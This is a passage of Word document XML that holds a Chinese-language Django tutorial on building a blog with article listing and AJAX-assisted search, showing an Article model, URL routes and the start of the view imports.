        <w:t xml:space="preserve">    STATUS_CHOICES = (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30BEF389" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        ('d', '</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>草稿</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72FC0883" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        ('p', '</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>发表</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BE78E43" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23744FD4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E0F00A8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    title = models.CharField('</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>标题</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>', max_length=200, unique=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="678A2320" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">    slug = models.SlugField('slug', max_length=60)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74FE5FA1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    body = models.TextField('</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>正文</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0325B04A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    pub_date = models.DateTimeField('</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>发布时间</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>', default=now, null=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1816B805" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    create_date = models.DateTimeField('</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>创建时间</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>', auto_now_add=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="662E48BE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    mod_date = models.DateTimeField('</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>修改时间</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>', auto_now=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CD4D42D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    status = models.CharField('</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>文章状态</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>', max_length=1, choices=STATUS_CHOICES, default='p')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="692731B2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    views = models.PositiveIntegerField('</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>浏览量</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>', default=0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="651B847B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    author = models.ForeignKey(User, verbose_name='</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>作者</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>', on_delete=models.CASCADE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12080AA0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="790FBF02" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def __str__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="150F21D5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return self.title</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70C3C7CF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E102D01" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    class Meta:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="641FE91D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        ordering = ['-pub_date']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04F28059" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        verbose_name = "</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>文章</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71DB944F" w14:textId="373EF2B9" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">       </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FD593DD" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F962DD3" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>urls.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F68B566" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>前文提到过我们需要设计2个功能性页面: 一个展示博客文章清单，一个搜索。然而在urls.py里我们却设计了3个URL。这是因为我们还要设计一个URL与AJAX进行后台数据交换。这是用户看不见的，后面我们会用到这个URL。当ajax发送请求到/blog/ajax/search/时，Django就会调用ajax_search方法来处理。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A98CA7C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.urls import path, re_path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25C13DBC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from . import views</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BE80536" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4131138A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># namespace</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08D38E4E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>app_name = 'blog'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20A7BDE0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A166A6A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>urlpatterns = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15B274FE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59171063" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 搜索文章</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D89AC30"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re_path(r'^search/$', views.article_search, name='article_search'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BBDE856" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3F136C2A"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用于与ajax交互</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39B56B4C"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re_path(r'^ajax/search/$', views.ajax_search, name='ajax_search'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="201C9CF1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="79910C3D"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展示所有文章</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38420146"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path('', views.ArticleListView.as_view(), name='article_list'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EC96FB7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3F03B0F1" w14:textId="5737B28B" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BA7F1CF" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="44F44706" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>views.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A558D30" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>对应3个URL，我们需要在视图里编写3个处理方法，其中ajax_search用来给搜索页面返回Json数据(查询到的文章数量)。article_search方法用来返回搜索结果。我们为什么不用ajax_search返回搜索结果呢？因为查询到的数据集可能非常大，而ajax方法一般仅应用于与服务器的少量数据交换。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="141D744A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F06820A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.views.generic import ListView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="233AB8D6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from .models import Article</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E51F36E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.shortcuts import render</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FB6A22D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from .forms import SearchForm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="141A891A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.http import JsonResponse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DBB058A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
